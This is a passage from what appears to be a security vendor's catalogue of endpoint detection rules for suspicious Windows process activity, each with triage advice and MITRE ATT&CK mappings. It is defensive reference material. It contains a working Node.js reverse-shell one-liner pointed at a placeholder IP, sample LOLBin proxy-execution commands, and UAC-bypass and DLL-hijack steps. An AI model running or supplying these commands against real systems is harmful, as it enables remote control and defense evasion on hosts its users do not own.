Attempt to identify the document that caused Curl to execute. Examine any other processes launched by the Office application. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Suspicious Process - Microsoft Office Spawns ntvdm.exe</summary>



#### Description

This detection identifies 'nvdtm.exe' being spawned by Microsoft Word or Excel. Execution of 'nvdtm.exe' has been observed in malicious document activity; under normal circumstances 'nvdtm.exe' should never be executed by an Office application. 

#### Recommendation

Examine any other children that the Word or Office process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Suspicious Process - Microsoft Word Spawning CPL File</summary>



#### Description

This detection identifies Microsoft Word launching a CPL file using 'control.exe'. This behavior is indicative of exploitation of CVE-2021-40444, an exploit which allows an attacker to craft a document that contains  a malicious ActiveX control that can execute arbitrary code. 

Microsoft has additional details on mitigation of this exploit: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444

#### Recommendation

Attempt to determine the document that caused this activity. Examine anything that may have been spawned by control.exe or rundll32.exe on the system. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Suspicious Process - mmc.exe Spawns Scripting Engine</summary>



#### Description

This detection identifies ‘mmc.exe’, the Microsoft Management Console, being used to spawn processes. Several malicious attack vectors use ‘mmc.exe’, and these techniques involve using DCOM for lateral movement (https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) and a UAC bypass (https://ibreak.software/2017/05/a-windows-uac-bypass-using-device-manager/).

#### Recommendation

Examine the process that was spawned, and any additional processes that that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Suspicious Process - Mobsync.exe Execution With No Arguments</summary>



#### Description

This detection identifies suspicious mobsync.exe process launching without standard argument. Malicious actors have been observed with this activity associated with Process Injection and deploying Cobalt Strike.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - Mode.com Select Codepage 1251</summary>



#### Description

This detection identifies the ”mode” command being used to set the codepage to 1251. This command has been observed in ransomware samples.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - Modification of UserInitMprLogonScript Registry Key</summary>



#### Description

This detection identifies the HKCU\Environment\UserInitMprLogonScript being modified via command line utilities, such as ‘Reg.exe’. This key contains scripts to be run upon login, and can be modified by malicious actors to achieve persistence. 

#### Recommendation

Examine the contents of UserInitMprLogonScript and any scripts it may point to. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Suspicious Process - Modification To Firewall For RDP</summary>



#### Description

This detection identifies the local firewall being modified using netsh.exe to allow remote connections to RDP.

#### Recommendation

Determine whether this is authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Remote Desktop Protocol - T1021.001
- Disable or Modify System Firewall - T1562.004


</details>



<details>
<summary>Suspicious Process - MSBuild Compiles and Executes from ProgramData Directory</summary>



#### Description

This detection identifies MSBuild being used to compile and execute code out of the Program Data directory. This has been observed in the Macaw ransomware.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Compile After Delivery - T1027.004


</details>



<details>
<summary>Suspicious Process - MSBuild.exe Possibly Executing Code from XML FIle</summary>



#### Description

This detection identifies ‘MsBuild.exe’ executing code from an XML file. Malicious actors can use ‘MsBuild.exe’ to load an XML file, with an .xml extension or a .csproj extension, containing C# code, which MSBuild will then compile and execute.

#### Recommendation

Investigate any child processes of MSBuild. Acquire and investigate the XML file that was loaded by MSBuild. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Compile After Delivery - T1027.004
- Trusted Developer Utilities Proxy Execution - T1127


</details>



<details>
<summary>Suspicious Process - MSBuild Spawns IExplore</summary>



#### Description

This detection identifies the ‘MSBuild.exe’ processes spawning ‘IExplore.exe’, which is the result of various droppers or downloaders using MSBuild to spawn a child process of IExplore, allocate memory within the newly spawned process, inject arbitrary code into the IExplore process, and modify the process memory and control flow for malicious purposes.

#### Recommendation

Acquire additional process artifacts and identify the root cause of the suspicious process. The source could be a document sent by a malicious actor to the user by email. Investigate the user's inbox to identify any malicious emails, and determine if any other users have received the email. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Dynamic-link Library Injection - T1055.001


</details>



<details>
<summary>Suspicious Process - MSDT Applocker Bypass</summary>



#### Description

This detection identifies the Microsoft Troubleshooter utility being used to execute a program. Malicious actors do this to bypass application security controls.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Suspicious Process - MSDTC Launched Process</summary>



#### Description

This detection identifies suspicious processes being spawned by 'MSDTC.exe', the Microsoft Distributed Transaction Coordinator. By placing a crafted DLL file named 'oci.dll' in the correct directory, a malicious actor can cause MSDTC to load the DLL and execute malicious code.

#### Recommendation

Examine the process that spawned by MSDTC, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Suspicious Process - MSHTA, CScript, WScript reading from HKCU</summary>



#### Description

This detection identifies MSHTA, CScript, or WScript reading from the Current User registry. ‘Fileless’ backdoors will often write code to the registry and use one of these utilities to read and execute it. 

#### Recommendation

If possible, examine the contents of the registry key. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Query Registry - T1012
- JavaScript - T1059.007
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - MSHTA.exe Spawns Reg.exe</summary>



#### Description

This detection identifies ‘MSHTA.exe’ spawning ‘Reg.exe’. This has been observed in malicious .hta documents sent to victims in order to attempt to perform credential dumping from the registry.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - MSHTA Reads File From ProgramData</summary>



#### Description

This detection identifies MSHTA reading a file from the ProgramData directory. ProgramData is a common staging directory for malicious actors. 

#### Recommendation

Review the contents of the file being read. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - MSHTA Spawns PowerShell</summary>



#### Description

This detection identifies the ‘mshta.exe’ application spawning ‘PowerShell.exe’. This technique was first used by the Kovter malware family, and is able to run Javascript and Visual Basic (VB) on the command line.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Signed Binary Proxy Execution - T1218
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - myip.opendns.com Response Redirected to File</summary>



#### Description

This detection identifies console commands which contact myip.opendns.com and redirect the response to a file. This behavior is often observed in use by malicious actors who are attempting to determine a system's external IP address. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Information Discovery - T1082


</details>



<details>
<summary>Suspicious Process - Netcat</summary>



#### Description

This detection identifies Netcat, a utility for reading and writing data across network connections. Malicious actors use Netcat for several malicious activities, such as data exfiltration or as a reverse shell.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Investigate any IP addresses being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over C2 Channel - T1041
- System Network Connections Discovery - T1049


</details>



<details>
<summary>Suspicious Process - Net.exe Create User</summary>



#### Description

This detection identifies users being created on a system using the 'net.exe' utility. Malicious actors may do this to create their own user accounts for maintaining access to the system. 

#### Recommendation

Ensure that the user was created as part of authorized IT activity. If this activity is not expected, consider deleting the account and further investigating the system for signs of compromise. 

#### MITRE ATT&CK Techniques

- Create Account - T1136


</details>



<details>
<summary>Suspicious Process - NetSh Deprecated IPSec Command</summary>



#### Description

This detection identifies the deprecated IPSec command being used to manipulate the local firewall.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Impair Defenses - T1562
- Disable or Modify System Firewall - T1562.004


</details>



<details>
<summary>Suspicious Process - netsh.exe disable interface</summary>



#### Description

This detection identifies the ‘netsh.exe’ utility being used to disable a network interface. Malware such as Lockergoga uses this utility to disable network connections.


#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Destruction - T1485


</details>



<details>
<summary>Suspicious Process - Netsh Firewall</summary>



#### Description

This detection identifies certain Netsh commands being used to modify the local firewall. Malicious actors, in particular the Cerber ransomware, have been observed engaging in this kind of activity. 


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Disable or Modify System Firewall - T1562.004


</details>



<details>
<summary>Suspicious Process - NetSh Helper Dll</summary>



#### Description

This detection identifies helper DLLs being added by the NetSh utility. Malicious DLL files can be loaded with netsh.exe using the 'add helper' command, which will then load whenever netsh.exe is run.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned.Investigate any child processes of netsh.exe. Helper DLLs can be identified in the HKLM\SOFTWARE\Microsoft\Netsh registry key. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password. 

#### MITRE ATT&CK Techniques

- Netsh Helper DLL - T1546.007


</details>



<details>
<summary>Suspicious Process - NetSh portproxy</summary>



#### Description

This detection identifies use of the netsh portproxy command, which can be used by malicious actors to tunnel egress traffic. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over Alternative Protocol - T1048
- Proxy - T1090


</details>



<details>
<summary>Suspicious Process - Ngrok Running From User Directory</summary>



#### Description

This detection identifies Ngrok being run out of a user's directory. Ngrok is a legitimate utility that is sometimes abused by attackers to tunnel traffic out to the internet. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Protocol Tunneling - T1572


</details>



<details>
<summary>Suspicious Process - Node Reverse Shell</summary>



#### Description

This detection identifies a reverse shell being created by Node. These reverse shells are written in JavaScript and cause the system to connect to and accept arbitrary commands from a remote c2 server. 

Example of a Node-based reverse shell:
node.exe -r net -e "sh = require('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(80, '192.0.2.29', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. Investigate any processes that were spawned by the reverse shell. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059


</details>



<details>
<summary>Suspicious Process - Obfuscated Registry Key</summary>



#### Description

This detection identifies registry keys that have been obfuscated using string concatenation. Malicious actors will break up strings in order to evade detection by string matching-based detections. 

#### Recommendation

Investigate the contents of the registry key in the command line. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - Octal, Hexadecimal, or Decimal IP Address in Command Line</summary>



#### Description

This detection identifies the use of IP addresses in octal, hexadecimal, or decimal format in the command line arguments of a command. Windows will translate these IP addresses into the proper format. Attackers may use this to evade detection of IP addresses. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Suspicious Process - ODBCConf Registering DLL</summary>



#### Description

This detection identifies 'ODBCConf.exe' being used to register a server from a DLL, similar to 'RegSvr32.exe'. A malicious actor may do this to execute the `DllRegisterServer` function from a malicious DLL. 

#### Recommendation

Investigate the DLL that is being registered. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - .ost Seen In Command Line</summary>



#### Description

This detection identifies the use of various command line utilities against a .ost file. This is performed by malicious actors when they copy/compress user’s offline Outlook mailboxes as they prepare for exfiltration.

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Local Email Collection - T1114.001


</details>



<details>
<summary>Suspicious Process - Output Redirect to Single Character Text File</summary>



#### Description

This detection identifies command line output being redirected to a single character text file. This is often done by malicious actors writing credentials or system information to a file.

#### Recommendation

Investigate the contents of text file being written. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- System Information Discovery - T1082


</details>



<details>
<summary>Suspicious Process - Password Search via PowerShell</summary>



#### Description

This detection identifies PowerShell potentially being used to search for unsecured passwords by searching for the strings 'password' or 'passwd' using the Select-String function. 

#### Recommendation

Investigate the PowerShell command that is being run. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Unsecured Credentials - T1552


</details>



<details>
<summary>Suspicious Process - Pastebin in PowerShell or Cmd.exe Command</summary>



#### Description

This detection identifies Pastebin URLs in PowerShell or ‘Cmd.exe’ commands. Pastebin is often used by malicious actors to host malicious scripts. 

#### Recommendation

Investigate the file being served from the Pastebin URL if it is still active. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Windows Command Shell - T1059.003
- Web Service - T1102


</details>



<details>
<summary>Suspicious Process - PATHTOVBS Environment Variable Present</summary>



#### Description

This detection identifies the use of the environment variable name by a malicious actor while deploying TrickBot/CobaltStrike. The environment variable points to the location on the file system that contains Visual Basic Script (VBS), which is used by malicious actors to execute malware on the compromised host.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Visual Basic - T1059.005
- Ingress Tool Transfer - T1105
- Lateral Tool Transfer - T1570


</details>



<details>
<summary>Suspicious Process - Path Traversal Evasion</summary>



#### Description

This detection identifies attempts at using certain file path syntax to attempt to evade detection. By including two dots in a file path, which is the shortcut for parent directory,  a malicious actor  can include directories in a file path that do not exist, or directories for  files they are not actually accessing. Malware, such as Emotet, uses this tactic to evade simple detections that strictly match on a file path. 

example:
calling C:\Windows\evil\malware\..\..\system32\cmd.exe will run C:\Windows\system32\cmd.exe. The fake directories \evil\ and \malware\ will be ignored.


#### Recommendation

Investigate the process that tries to load something with an obfuscated file path, and investigate any processes that are launched from that file path.

</details>



<details>
<summary>Suspicious Process - Pcalua.exe Spawns Script Interpreter</summary>



#### Description

This detection identifies the Program Compatibility Assistant, ‘pcalua.exe’, being used by a malicious actor to execute commands and evade detections that rely on identifying process execution chains.

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Indirect Command Execution - T1202


</details>



<details>
<summary>Suspicious Process - Persistence via Magnify/Sticky Keys debugger</summary>



#### Description

This detection identifies a deubgger being set for Windows accessibility tools. Windows has a number of accessibility programs that are accessible on a locked PC in order to allow users who need the tools to log in, such as 'magnify.exe', 'sethc.exe', and 'utilman.exe'. An attacker can set the debugger for these applications to, or replace them binaries with, a binary of their choosing, allowing the attacker to run them without being logged in.

#### Recommendation

Investigate any child processes launched by the accessibility tool, and any application that has been set as the debugger for that tool. Determine if the binary for the accessibility tool is the original Microsoft binary.  

#### MITRE ATT&CK Techniques

- Accessibility Features - T1546.008


</details>



<details>
<summary>Suspicious Process - .pif File</summary>



#### Description

A .pif file, or Program Information File, is a legacy file format dating back to DOS that is still compatible with modern versions of Windows. .pif files are rarely used today, but have been observed in use by malicious actors. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Suspicious Process - Ping and Type</summary>



#### Description

This detection identifies  the ping command with the -n flag being used by a malicious actor to serve as a ‘wait’ command, followed by the type command being used on a binary to make a copy of that binary. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Suspicious Process - Ping Piping Output to Another Process</summary>



#### Description

This detection identifies a malicious actor using the ping command and piping the output to another executable, which will cause that executable to run. Malicious actors do this to attempt defense evasion.

#### Recommendation

Investigate the executable that is being piped to. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Indirect Command Execution - T1202


</details>



<details>
<summary>Suspicious Process - PkgMgr.exe Spawns Dism.exe, Possible UAC Bypass</summary>



#### Description

This detection identifies 'PkgMgr.exe' spawning 'Dism.exe'. An actor can bypass UAC by dropping a malicious DLL named DismCore.dll in the C:\Windows\SysWOW64\ or C:\Windows\System32\ directory. The actor will then run pkgmgr.exe with the /n flag, which causes DISMHost.exe to run with elevated permissions. DISMHost will search for DismCore.dll in  C:\Windows\SysWOW64\ and C:\Windows\System32\ before searching the correct directory, C:\Windows\SysWOW64\Dism\DismCore.dll. The malicious DismCore.dll placed in one of those directories will be loaded with elevated privileges. 

#### Recommendation

Search C:\Windows\SysWOW64\ and C:\Windows\System32\ for a file named DismCore.dll. The legitimate DismCore.dll should never appear in these directories. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002
- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Suspicious Process - Possible BGInfo.exe Proxy Execution</summary>



#### Description

BGInfo.exe, the Background Information Utility included in the Microsoft SysInternals Suite, can be used to proxy the execution of a script and bypass protections like AppLocker and Device Guard.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Possible code execution via the Windows Update client</summary>



#### Description

A malicious actor can execute arbitrary code by passing a DLL file as an argument to the Windows Update client (wuauclt.exe) along with the argument UpdateDeploymentProvider.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Possible DLL Injection Using  MavInject.exe</summary>



#### Description

This detection identifies the use of 'MavInject.exe'. Malicious actors  can use the signed and trusted Microsoft utility, MavInject to inject a malicious DLL into a running process.

#### Recommendation

Investigate any unknown DLLs listed in MavInject's command line execution options. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Possible Microsoft.Workflow.Compiler.exe AppControl Bypass</summary>



#### Description

This detection identifies ‘Microsoft.Workflow.Compiler.exe’, which is a utility included with .NET that can be used to execute arbitrary code from a trusted process, bypassing application whitelisting. Data will be read and executed from an XML file containing a CompilerInput object. 

#### Recommendation

Investigate surrounding events, and acquire and analyze any XML files in command line. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Trusted Developer Utilities Proxy Execution - T1127
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Possible Protocol Handler Poisoning</summary>



#### Description

This detection identifies possible protocol handler poisoning attacks, in which a new protocol handler is added to Windows in order to execute a specified malicious command.


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Change Default File Association - T1546.001


</details>



<details>
<summary>Suspicious Process - Possible Proxy Execution via RCSI.exe </summary>



#### Description

This detection identifies ‘CSI.exe’ and ‘RCSI.exe’ spawning processes. These binaries can be used by a malicious actor to execute unsigned code, which bypasses application whitelisting.

#### Recommendation

Investigate any child process of ‘CSI.exe’ or ‘RCSI.exe’. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Trusted Developer Utilities Proxy Execution - T1127
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Possible UAC Bypass via MMC.exe</summary>



#### Description

This detection identifies MMC.exe running with the arguments C:\WINDOWS\system32\compmgmt.msc /s. This will cause the system to load C:\Windows\System32\elsext.dll, which can easily be targeted for DLL hijacking.


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Suspicious Process - Possible VirtualBox Ransomware Attack</summary>



#### Description

This detection identifies Possible VirtualBox Ransomware Attack. Malicious actors were observed to register and run VirtualBox application extensions VBoxC.dll and VBoxRT.dll, and the VirtualBox driver VboxDrv.sys before encrypting virtual machines with Ransomware. 

#### Recommendation

Examine the parent process that spawned the process in question. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - Potential AppVLP Proxy Execution</summary>



#### Description

AppVLP.exe, the Microsoft Office Application Virtualization Utility, can be used to proxy the execution of another binary or script in order to bypass defenses that prevent user execution.

Examples:
Execution of a script from a WebDav server: appvlp.exe \\webdav\script.bat
Execution of a PowerShell command: appvlp.exe powershell.exe -c "echo hello"

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Potential DXCap.exe Proxy Execution</summary>



#### Description

Dxcap.exe, the DirectX diagnostics/debugger included with Visual Studio, can be used to proxy the execution of a process in order to evade defenses like AppLocker and DeviceGuard.

Example:
dxcap.exe -c C:\Windows\System32\cmd.exe

#### Recommendation

Determine whether this is part of authorized administrator activity. Investigate the process that is being executed by Dxcap.exe. Examine the parent process of Dxcap.exe, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Potential MSDeploy.exe Proxy Execution</summary>



#### Description

MSDeploy.exe, Microsoft's utility for deploying web apps, can be used to proxy the execution of a script and bypass defenses like AppLocker and DeviceGuard. 

Example:
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="malware.bat"

#### Recommendation

Determine whether this is part of authorized administrator activity. Investigate the contents of the script that is being run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - Potential MSXSL Proxy Execution</summary>



#### Description

The MSXSL utility can be used to execute arbitrary code stored in an xsl file, bypassing defenses like application whitelisting. This can be done with a locally stored xsl file, or with a remote file over HTTP.

#### Recommendation

Investigate the contents of the XSL file. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- XSL Script Processing - T1220


</details>



<details>
<summary>Suspicious Process - Potential SLUI.exe UAC Bypass</summary>



#### Description

This detection identifies SLUI.exe being used for a potential UAC bypass. A malicious actor can achieve a UAC bypass using trusted binary SLUI.exe by setting the contents of the HKCU\Software\Classes\exefile\shell or HKCU\Software\Classes\launcher.Systemsettings\Shell\open\command registry keys.

#### Recommendation

Check the contents of the registry key being modified. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - PowerPoint Spawns Suspicious Process</summary>



#### Description

This detection identifies PowerPoint aunching a suspicious process. Malicious actors may craft malicious PowerPoint files that can execute arbitrary code on a system. 

#### Recommendation

Analyze any PowerPoint files the user may have opened during the timeframe of this alert. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - Powershell, BITSAdmin retrieving from GitHub</summary>



#### Description

This detection identifies PowerShell or Bitsadmin attempting to retrieve content from GitHub domains. Malicious actors often use code stored on GitHub in order to evade defenses. 

#### Recommendation

Review the process execution timeline on the host to identify other attacker related activity. Review the URL being passed to the binary and determine if this object's use is authorized.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Web Service - T1102
- Ingress Tool Transfer - T1105
- BITS Jobs - T1197


</details>



<details>
<summary>Suspicious Process - PowerShell Command Deleting MSI</summary>



#### Description

This detection identifies the execution of the PowerShell command with flags "del" or "remove-item" to delete a file. This technique is used by threat actors to hide process activity in order to avoid detection. Threat actors can execute a PowerShell command to download an MSI binary, execute it using msiexec and delete the downloaded MSI file.

#### Recommendation

 Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Connect Function to Routable IP Address</summary>



#### Description

Identifies the System.Net.Sockets.TcpClient.Connect function in PowerShell being used to initiate a connection to a remote IP address.

#### Recommendation

Investigate the IP address that is being contacted. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Application Layer Protocol - T1071
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - PowerShell CopyFromScreen</summary>



#### Description

This detection identifies the CopyFromScreen function being used in PowerShell. Malicious actors may use this function to capture the contents of the screen.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. Attempt to determine what the PowerShell script is doing with the screen data gathered by CopyFromScreen. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Screen Capture - T1113


</details>



<details>
<summary>Suspicious Process - PowerShell Creates Network Socket</summary>



#### Description

This detection identifies use of the System.Net.Sockets.TCPClient function in PowerShell to create a connection to a remote IP address.

#### Recommendation

Investigate the remote IP address being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Disable Computer Restore</summary>



#### Description

This detection identifies the ‘disable-computerrestore’ being passed to ‘PowerShell.exe’ in the command line. This technique is used by malicious actors to remove backup copies of files immediately prior to the execution of ransomware to increase the likelihood of a target paying the ransom.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Data Destruction - T1485
- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - PowerShell DNS TXT Lookup</summary>



#### Description

